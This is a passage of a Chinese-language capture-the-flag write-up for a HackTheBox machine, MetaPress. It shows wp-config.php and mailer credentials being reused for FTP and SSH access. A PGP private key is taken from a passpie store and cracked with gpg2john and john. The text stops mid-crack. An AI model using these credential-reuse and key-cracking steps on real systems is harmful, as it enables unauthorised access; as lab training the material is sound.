PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==|base64 -d &lt;?php /** The name of the database for WordPress */ define( &#39;DB_NAME&#39;, &#39;blog&#39; ); /** MySQL database username */ define( &#39;DB_USER&#39;, &#39;blog&#39; ); /** MySQL database password */ define( &#39;DB_PASSWORD&#39;, &#39;635Aq@TdqrCwXFUZ&#39; ); /** MySQL hostname */ define( &#39;DB_HOST&#39;, &#39;localhost&#39; ); /** Database Charset to use in creating database tables. */ define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; ); /** The Database Collate type. Don&#39;t change this if in doubt. */ define( &#39;DB_COLLATE&#39;, &#39;&#39; ); define( &#39;FS_METHOD&#39;, &#39;ftpext&#39; ); define( &#39;FTP_USER&#39;, &#39;metapress.htb&#39; ); define( &#39;FTP_PASS&#39;, &#39;9NYS_ii@FyL_p5M2NvJ&#39; ); define( &#39;FTP_HOST&#39;, &#39;ftp.metapress.htb&#39; ); define( &#39;FTP_BASE&#39;, &#39;blog/&#39; ); define( &#39;FTP_SSL&#39;, false ); /**#@+ * Authentication Unique Keys and Salts. * @since 2.6.0 */ define( &#39;AUTH_KEY&#39;, &#39;?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n&gt;+3m?.B/:&#39; ); define( &#39;SECURE_AUTH_KEY&#39;, &#39;x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%&#39; ); define( &#39;LOGGED_IN_KEY&#39;, &#39;J+mxCaP4z&lt;g.6P^t`ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C{qKXy&#39; ); define( &#39;NONCE_KEY&#39;, &#39;SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5&#39; ); define( &#39;AUTH_SALT&#39;, &#39;[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s}d&lt;&amp;M;.,x0z~R&gt;3!D&#39; ); define( &#39;SECURE_AUTH_SALT&#39;, &#39;&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.&#39; ); define( &#39;LOGGED_IN_SALT&#39;, &#39;4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=&#39; ); define( &#39;NONCE_SALT&#39;, &#39;.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL&#39; ); /** * WordPress Database Table prefix. */ $table_prefix = &#39;wp_&#39;; /** * For developers: WordPress debugging mode. * @link https://wordpress.org/support/article/debugging-in-wordpress/ */ define( &#39;WP_DEBUG&#39;, false ); /** Absolute path to the WordPress directory. */ if ( ! defined( &#39;ABSPATH&#39; ) ) { define( &#39;ABSPATH&#39;, __DIR__ . &#39;/&#39; ); } /** Sets up WordPress vars and included files. */ require_once ABSPATH . &#39;wp-settings.php&#39;; define( &#39;FTP_USER&#39;, &#39;metapress.htb&#39; ); define( &#39;FTP_PASS&#39;, &#39;9NYS_ii@FyL_p5M2NvJ&#39; ); 我们得到了 ftp 的登陆账号和密码 ┌──(root㉿kali)-[~/Desktop] └─# ftp 10.10.11.186 Connected to 10.10.11.186. 220 ProFTPD Server (Debian) [::ffff:10.10.11.186] Name (10.10.11.186:root): metapress.htb 331 Password required for metapress.htb Password: 230 User metapress.htb logged in Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; ls 229 Entering Extended Passive Mode (|||1913|) 150 Opening ASCII mode data connection for file list drwxr-xr-x 5 metapress.htb metapress.htb 4096 Oct 5 14:12 blog drwxr-xr-x 3 metapress.htb metapress.htb 4096 Oct 5 14:12 mailer 226 Transfer complete ftp&gt; cd mailer 250 CWD command successful ftp&gt; ls 229 Entering Extended Passive Mode (|||27331|) 150 Opening ASCII mode data connection for file list drwxr-xr-x 4 metapress.htb metapress.htb 4096 Oct 5 14:12 PHPMailer -rw-r--r-- 1 metapress.htb metapress.htb 1126 Jun 22 2022 send_email.php 226 Transfer complete ftp&gt; get send_email.php local: send_email.php remote: send_email.php 229 Entering Extended Passive Mode (|||3114|) 150 Opening BINARY mode data connection for send_email.php (1126 bytes) 100% |**********************************************************************************************************************************************************************| 1126 5.45 MiB/s 00:00 ETA 226 Transfer complete 1126 bytes received in 00:00 (4.08 KiB/s) 这里看到有一个 send_email.php 文件，然后下载下来了 ┌──(root㉿kali)-[~/Desktop] └─# cat send_email.php &lt;?php /* * This script will be used to send an email to all our users when ready for launch */ use PHPMailer\\PHPMailer\\PHPMailer; use PHPMailer\\PHPMailer\\SMTP; use PHPMailer\\PHPMailer\\Exception; require &#39;PHPMailer/src/Exception.php&#39;; require &#39;PHPMailer/src/PHPMailer.php&#39;; require &#39;PHPMailer/src/SMTP.php&#39;; $mail = new PHPMailer(true); $mail-&gt;SMTPDebug = 3; $mail-&gt;isSMTP(); $mail-&gt;Host = &quot;mail.metapress.htb&quot;; $mail-&gt;SMTPAuth = true; $mail-&gt;Username = &quot;jnelson@metapress.htb&quot;; $mail-&gt;Password = &quot;Cb4_JmWM8zUZWMu@Ys&quot;; $mail-&gt;SMTPSecure = &quot;tls&quot;; $mail-&gt;Port = 587; $mail-&gt;From = &quot;jnelson@metapress.htb&quot;; $mail-&gt;FromName = &quot;James Nelson&quot;; $mail-&gt;addAddress(&quot;info@metapress.htb&quot;); $mail-&gt;isHTML(true); $mail-&gt;Subject = &quot;Startup&quot;; $mail-&gt;Body = &quot;&lt;i&gt;We just started our new blog metapress.htb!&lt;/i&gt;&quot;; try { $mail-&gt;send(); echo &quot;Message has been sent successfully&quot;; } catch (Exception $e) { echo &quot;Mailer Error: &quot; . $mail-&gt;ErrorInfo; } $mail-&gt;Username = &quot;jnelson@metapress.htb&quot;; $mail-&gt;Password = &quot;Cb4_JmWM8zUZWMu@Ys&quot;; 可以看到这里的账户在之前的 &#x2F;etc&#x2F;passwd 中有出现，并且是有 &#x2F;bin&#x2F;bash 权限的，这样我们就得到了一个 ssh 账户 ┌──(root㉿kali)-[~/Desktop] └─# ssh jnelson@10.10.11.186 The authenticity of host &#39;10.10.11.186 (10.10.11.186)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:0PexEedxcuaYF8COLPS2yzCpWaxg8+gsT1BRIpx/OSY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.186&#39; (ED25519) to the list of known hosts. jnelson@10.10.11.186&#39;s password: Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sat Dec 31 18:52:04 2022 from 10.10.14.96 jnelson@meta2:~$ whoami&amp;&amp;id jnelson uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson) 成功拿到 user 权限 jnelson@meta2:~$ cat user.txt bfe452b37100243ff838f397eac125e9 成功拿到 user 权限的 flag 文件 权限提升jnelson@meta2:~$ ls -la total 32 drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 . drwxr-xr-x 3 root root 4096 Oct 5 15:12 .. lrwxrwxrwx 1 root root 9 Jun 26 2022 .bash_history -&gt; /dev/null -rw-r--r-- 1 jnelson jnelson 220 Jun 26 2022 .bash_logout -rw-r--r-- 1 jnelson jnelson 3526 Jun 26 2022 .bashrc drwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .local dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie -rw-r--r-- 1 jnelson jnelson 807 Jun 26 2022 .profile -rw-r----- 1 root jnelson 33 Dec 31 19:18 user.txt jnelson@meta2:~/.passpie/ssh$ ls -la total 16 dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 . dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .. -r-xr-x--- 1 jnelson jnelson 683 Oct 25 12:52 jnelson.pass -r-xr-x--- 1 jnelson jnelson 673 Oct 25 12:52 root.pass 在目录 &#x2F;home&#x2F;jnelson&#x2F;.passpie&#x2F;ssh 下有一个 root.pass，感觉挺有意思的，查看一下内容 jnelson@meta2:~/.passpie/ssh$ cat root.pass comment: &#39;&#39; fullname: root@ssh login: root modified: 2022-06-26 08:58:15.621572 name: ssh password: &#39;-----BEGIN PGP MESSAGE----- hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2 nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr lpF0RatbxQGWBks5F3o= =uh1B -----END PGP MESSAGE----- &#39; 然后还有一个 .keys 文件，但是我们没有权限访问，将它下载到本地 scp jnelson@10.10.11.186:.passpie/.keys keys ┌──(root㉿kali)-[~/Desktop] └─# cat .keys -----BEGIN PGP PUBLIC KEY BLOCK----- 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 fo6KI+w2uXLaw+bIT1XZurDN =dqsF -----END PGP PUBLIC KEY BLOCK----- -----BEGIN PGP PRIVATE KEY BLOCK----- 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 =7Uo6 -----END PGP PRIVATE KEY BLOCK----- 然后我删除了 .keys 中的 public 密钥 -----BEGIN PGP PRIVATE KEY BLOCK----- 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 =7Uo6 -----END PGP PRIVATE KEY BLOCK----- 接着去破解 PGP 文件 ┌──(root㉿kali)-[~/Desktop] └─# gpg2john keys &gt; gpg.john File keys ┌──(root㉿kali)-[~/Desktop] └─# john --wordlist=/usr/share/wordlists/rockyou.txt gpg.john Using default input 